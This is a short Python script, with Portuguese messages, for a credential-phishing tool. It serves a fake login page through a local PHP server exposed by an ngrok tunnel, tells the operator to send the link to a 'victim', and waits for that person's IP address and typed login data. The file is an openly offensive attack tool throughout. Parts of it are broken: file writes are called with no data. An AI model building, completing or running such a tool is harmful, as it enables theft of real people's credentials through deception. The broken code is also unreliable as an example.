import os,time,ui,requests
def phish(server):
	Sair = False
	while(Sair == False):
		ui.dialog('    iniciando PHP     ');os.system('cd telas/'+str(server)+' && php -S 127.0.0.1:3333 > /dev/null 2>&1 &') # Subindo o server
		ui.dialog('    iniciando NGROK   ');os.system(f'./ngrok http 3333 > /dev/null 2>&1 &') # Subindo o NGROK
		ui.dialog('criando banco de dados');arquivo = open('dados.txt','a')
		login = False;ip = False
		linke = requests.get('http://127.0.0.1:4040/api/tunnels').json()
		while (True):
				try:
					if ip == False:
						ui.dialog('Envie esse link para a vitima: '+linke["tunnels"][0]["public_url"]+'\nEsperando conexão, seja um pescador paciente\nnota:Você tem 2 horas')
					elif login == True:
						ui.dialog('Dados recebidos,esperando a próxima vítima') 
					else:
						ui.dialog('Um peixe mordeu a isca, esperando que ele digite os dados')
					if os.path.exists('ip.txt'):
						ip = True
						arquivo.write()
					if os.path.exists('login.txt'):
						login = True
						arquivo.write()
				except KeyboardInterrupt:
					arquivo.close()
					if os.path.exists('ip.txt'):
						os.remove('ip.txt');os.remove('login.txt')
					ui.dialog('Saindo de cena');exit()
	
if __name__ == '__main__':
	print('Não é possível executar o script assim.')
